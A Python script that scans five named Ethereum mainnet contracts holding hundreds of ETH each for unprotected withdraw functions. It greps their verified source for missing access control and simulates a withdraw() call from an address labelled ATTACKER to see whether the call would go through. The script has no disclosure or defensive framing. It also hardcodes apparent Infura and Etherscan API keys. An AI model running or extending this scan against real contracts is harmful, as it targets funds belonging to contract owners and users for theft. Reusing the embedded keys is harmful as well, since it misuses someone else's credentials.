#!/usr/bin/env python3
"""
Check ERC20 contracts with high ETH balances for withdrawal vulnerabilities
"""
import json
import subprocess
import time

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ETHERSCAN_API = "5UWN6DNT7UZCEJYNE3J6FCVAWH4QJW255K"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return None

def eth_call(to, data, from_addr=None):
    call_obj = {"to": to, "data": data}
    if from_addr:
        call_obj["from"] = from_addr
    return rpc_call("eth_call", [call_obj, "latest"])

def get_source(addr):
    url = f"https://api.etherscan.io/v2/api?chainid=1&module=contract&action=getsourcecode&address={addr}&apikey={ETHERSCAN_API}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    try:
        data = json.loads(result.stdout)
        if data.get("status") == "1" and data.get("result"):
            return data["result"][0]
        return None
    except:
        return None

# High-value ERC20 contracts to check
targets = [
    ("0x2ccfa2acf6ff744575ccf306b44a59b11c32e44b", 415.70),
    ("0x7b4a7fd41c688a7cb116534e341e44126ef5a0fd", 313.71),
    ("0xb54ca24ac19098db42454c8ee8df67d260a22b1e", 300.01),
    ("0xdbfb513d25df56b4c3f5258d477a395d4b735824", 293.04),
    ("0xb958a8f59ac6145851729f73c7a6968311d8b633", 293.00),
]

ATTACKER = "0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF"

print("=" * 80)
print("ERC20 CONTRACTS WITH HIGH ETH BALANCES")
print("Looking for withdrawal vulnerabilities...")
print("=" * 80)

for addr, expected_bal in targets:
    print(f"\n{'='*80}")
    print(f"Contract: {addr}")
    print(f"Expected ETH: {expected_bal:.2f}")
    print("=" * 80)
    
    # Check actual balance
    bal = rpc_call("eth_getBalance", [addr, "latest"])
    balance = int(bal['result'], 16) / 1e18 if bal else 0
    print(f"Actual ETH balance: {balance:.2f} ETH")
    
    # Get source
    time.sleep(0.3)
    source = get_source(addr)
    
    if source:
        contract_name = source.get("ContractName", "Unknown")
        src = source.get("SourceCode", "")
        print(f"Contract name: {contract_name}")
        print(f"Source length: {len(src)} chars")
        
        # Look for ETH handling patterns
        if src:
            patterns_found = []
            if "withdraw" in src.lower():
                patterns_found.append("withdraw")
            if "receive()" in src or "fallback()" in src:
                patterns_found.append("receive/fallback")
            if "selfdestruct" in src.lower():
                patterns_found.append("selfdestruct")
            if "payable" in src.lower():
                patterns_found.append("payable functions")
            
            print(f"Patterns found: {', '.join(patterns_found) if patterns_found else 'none'}")
            
            # Look for unprotected withdraw
            if "withdraw" in src.lower():
                lines = src.split('\n')
                for i, line in enumerate(lines):
                    if 'function' in line.lower() and 'withdraw' in line.lower():
                        # Check if has onlyOwner or similar
                        context = '\n'.join(lines[max(0,i-1):min(len(lines),i+10)])
                        if 'onlyOwner' in context or 'require(msg.sender' in context or 'require(owner' in context:
                            print(f"  -> withdraw has access control")
                        else:
                            print(f"  -> POSSIBLE UNPROTECTED WITHDRAW!")
                            print(f"     {line.strip()[:80]}")
    else:
        print("Source not verified")
    
    # Test withdraw function directly
    print("\nTesting withdraw functions:")
    
    # Try withdraw() - 0x3ccfd60b
    gas_resp = rpc_call("eth_estimateGas", [{"from": ATTACKER, "to": addr, "data": "0x3ccfd60b"}, "latest"])
    if gas_resp and "result" in gas_resp:
        print(f"  withdraw(): Gas = {int(gas_resp['result'], 16)} - MIGHT BE CALLABLE")
    elif gas_resp and "error" in gas_resp:
        err = gas_resp.get("error", {})
        if isinstance(err, dict):
            print(f"  withdraw(): REVERTS")
    
    # Check owner
    owner_resp = eth_call(addr, "0x8da5cb5b")
    if owner_resp and "result" in owner_resp:
        owner = "0x" + owner_resp["result"][-40:]
        if owner != "0x0000000000000000000000000000000000000000":
            print(f"  Owner: {owner}")
    
    time.sleep(0.3)

